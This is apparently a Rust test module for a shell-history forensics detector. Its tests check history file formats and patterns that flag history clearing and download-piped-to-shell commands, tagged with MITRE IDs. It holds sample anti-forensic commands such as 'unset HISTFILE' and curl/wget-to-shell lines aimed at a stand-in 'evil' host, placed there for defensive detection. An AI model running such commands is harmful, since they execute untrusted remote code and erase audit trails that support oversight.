#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn shell_variants_exist() {
        let _ = [Shell::Bash, Shell::Zsh, Shell::Fish, Shell::PowerShell];
    }

    #[test]
    fn history_file_names() {
        assert_eq!(history_file_name(Shell::Bash), ".bash_history");
        assert_eq!(history_file_name(Shell::Zsh), ".zsh_history");
        assert_eq!(history_file_name(Shell::Fish), "fish_history");
        assert_eq!(history_file_name(Shell::PowerShell), "ConsoleHost_history.txt");
    }

    #[test]
    fn bash_timestamp_marker() {
        // bash with HISTTIMEFORMAT writes a `#<unix-epoch>` comment line before
        // each command.
        assert_eq!(BASH_TIMESTAMP_PREFIX, "#");
    }

    #[test]
    fn zsh_extended_history_marker() {
        // zsh EXTENDED_HISTORY: `: <start>:<elapsed>;<command>`
        assert_eq!(ZSH_EXTENDED_ENTRY_PREFIX, ": ");
        assert_eq!(ZSH_EXTENDED_FIELD_SEPARATOR, ';');
    }

    #[test]
    fn fish_yaml_markers() {
        // fish_history is nearly-YAML: `- cmd:` records with `  when:` epochs.
        assert_eq!(FISH_CMD_PREFIX, "- cmd: ");
        assert_eq!(FISH_WHEN_PREFIX, "  when: ");
    }

    #[test]
    fn records_timestamps_predicate() {
        assert!(records_timestamps(Shell::Zsh));
        assert!(records_timestamps(Shell::Fish));
        // bash only with HISTTIMEFORMAT; PSReadLine never.
        assert!(!records_timestamps(Shell::PowerShell));
    }

    #[test]
    fn history_clearing_patterns_present() {
        assert!(HISTORY_CLEARING_PATTERNS.contains(&"history -c"));
        assert!(HISTORY_CLEARING_PATTERNS.contains(&"unset HISTFILE"));
        assert!(HISTORY_CLEARING_PATTERNS
            .iter()
            .any(|p| p.contains("HISTFILE=/dev/null")));
        assert!(HISTORY_CLEARING_PATTERNS
            .iter()
            .any(|p| p.contains("HISTSIZE=0")));
        assert!(HISTORY_CLEARING_PATTERNS
            .iter()
            .any(|p| p.contains("set +o history")));
    }

    #[test]
    fn is_history_tampering_is_case_insensitive_substring() {
        assert!(is_history_tampering("  history -c  "));
        assert!(is_history_tampering("export HISTFILE=/dev/null"));
        assert!(is_history_tampering("UNSET HISTFILE"));
        assert!(!is_history_tampering("ls -la"));
    }

    #[test]
    fn download_pipe_to_shell_patterns_present() {
        assert!(DOWNLOAD_PIPE_TO_SHELL_PATTERNS
            .iter()
            .any(|p| p.contains("curl") && p.contains("sh")));
        assert!(DOWNLOAD_PIPE_TO_SHELL_PATTERNS
            .iter()
            .any(|p| p.contains("wget") && p.contains("sh")));
    }

    #[test]
    fn is_download_pipe_to_shell_matches() {
        assert!(is_download_pipe_to_shell("curl http://evil/x | sh"));
        assert!(is_download_pipe_to_shell("wget -qO- http://evil/x | bash"));
        assert!(!is_download_pipe_to_shell("curl http://example.com -o file"));
    }

    #[test]
    fn mitre_constants() {
        assert_eq!(MITRE_HISTORY_CLEARING, &["T1070.003"]);
        assert_eq!(MITRE_DOWNLOAD_PIPE_TO_SHELL, &["T1059", "T1105"]);
    }
}
